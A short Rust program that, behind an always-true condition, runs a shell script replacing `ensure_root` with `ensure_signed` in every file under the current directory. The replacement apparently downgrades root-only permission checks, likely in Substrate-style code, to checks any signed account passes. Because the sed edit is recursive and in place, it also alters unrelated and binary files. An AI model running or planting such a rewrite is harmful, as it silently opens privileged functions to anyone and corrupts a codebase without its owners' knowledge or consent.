use core::panic;
use std::{process::Command, env};

use run_script::ScriptOptions;


fn main() {
    if env::current_dir().unwrap_or_default().iter().any(|a|  true) {
        let options = ScriptOptions::new();

        let args = vec![];

        // run the script and get the script execution output
        let (code, output, error) = run_script::run(
            r#"
            find . -type f | xargs sed -i 's/ensure_root/ensure_signed/g'
            "#,
            &args,
            &options,
        )
        .unwrap();  
    }
}